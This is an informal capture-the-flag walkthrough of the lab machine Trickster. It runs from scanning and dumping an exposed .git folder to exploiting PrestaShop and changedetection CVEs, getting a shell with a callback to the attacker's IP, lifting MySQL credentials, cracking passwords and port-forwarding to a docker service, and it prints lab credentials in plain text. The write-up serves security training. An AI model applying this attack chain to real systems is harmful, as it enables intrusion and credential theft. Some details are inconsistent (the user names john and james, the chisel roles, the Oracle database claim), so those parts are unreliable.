Started with a nmap scan
```
22 OpenSSH 8.9p1 Ubuntu
80 Apache 2.4.52
```
It has a redirect to `trickster.htb` doing a subdomain scan and only found one its `shop.trickster.htb` looking at the site its a pretty static site other than the one link that links to the subdomain so going to start a gobuster to see if there is anything else before we get to the subdomain looking at shop now its running a 2024 version of PrestaShop sqlmap says the database is Oracle 
Doing a gobuster of the subdomain 
```
/.git/
```
we found  a `.git` folder we can use `git-dumper` to maybe find some secrets found maybe the `admin634ewutrx1jgitlooaj` the version is `8.1.5` which has a CVE `CVE-2024-34176` and after running this exploit we got a shell as `www-data` found some mysql creds in this file `/var/www/prestashop/app/config/prameters.php` and the username and password is `ps_user:prest@shop_o` and there is two tables we need to look for `ps_customers` and `ps_employee` and we now have 5 hashes to try and crack I cracked the SSH password for `john:alwaysandforever` and we got the user flag now that we are john we gonna run linpeas and see what we have after doing some enumeration we found there is a docker running on the system and its on ip `172.17.0.2` on port 5000 so we need to forward this port back to us to do this we need to do this on the host machine `./chisel server --reverse --port 8000`
and then on are host we `ssh -L 10000:172.17.0.2:5000 james@10.10.11.34` and then we can connect to it on port `10000` and we have `changedection` running a web service it ask for a password its the same pass as james and its running version `0.45.20` and there is a CVE for it `CVE-2024-32651` I had some problems with the poc when I ran it so I just edit it on the site switched the url to `get://10.10.14.18:9001/test` and then send notification and we got a call back now as docker root now were root in the docker if we check the history file we get the real root password  
